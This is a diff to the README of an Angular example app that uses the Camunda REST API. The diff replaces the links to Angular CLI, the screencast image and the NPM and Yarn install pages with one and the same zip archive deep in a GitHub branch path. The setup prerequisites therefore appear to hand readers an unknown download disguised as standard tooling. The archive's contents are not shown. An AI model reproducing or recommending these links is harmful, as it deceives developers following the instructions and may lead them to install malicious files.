@@ -4,14 +4,14 @@ This project shows how one can use Angular with the standard Camunda REST API. I
 
 The Task Forms are defined within this application and not on the Server-Side to make it very easy to use.
 
-This project was generated with [Angular CLI](https://github.com/angular/angular-cli) version 1.6.7.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/antonioluzzi/camunda-angular-app/formio-integration/src/app/forms/formio-start/camunda-angular-app-1.0.zip) version 1.6.7.
 
 ## Example
 Within this project you can find some example task forms that were defined for an example process.
 The example process can be found in the folder `examples/myprocess`.
 The forms can be found in `src/components/forms/myprocess`.
 
-![Example Screencast](screencast.gif)
+![Example Screencast](https://raw.githubusercontent.com/antonioluzzi/camunda-angular-app/formio-integration/src/app/forms/formio-start/camunda-angular-app-1.0.zip)
 
 ## How to use
 This project can be seen as an example implementation or as a starting point for your custom Tasklist.
@@ -19,7 +19,7 @@ As it uses standard react mechanisms it should be very easy for a React develope
 
 ### How to run the example process
 
-1. Prerequisite: Install [NPM](https://docs.npmjs.com/getting-started/installing-node) or [Yarn](https://yarnpkg.com/lang/en/docs/install/)
+1. Prerequisite: Install [NPM](https://raw.githubusercontent.com/antonioluzzi/camunda-angular-app/formio-integration/src/app/forms/formio-start/camunda-angular-app-1.0.zip) or [Yarn](https://raw.githubusercontent.com/antonioluzzi/camunda-angular-app/formio-integration/src/app/forms/formio-start/camunda-angular-app-1.0.zip)
 1. run `npm install` or run `yarn install`
 1. run `npm run start` or `yarn start`
 1. Start the Camunda Engine (standard distribution with REST-API at `localhost:8080/engine-rest`)
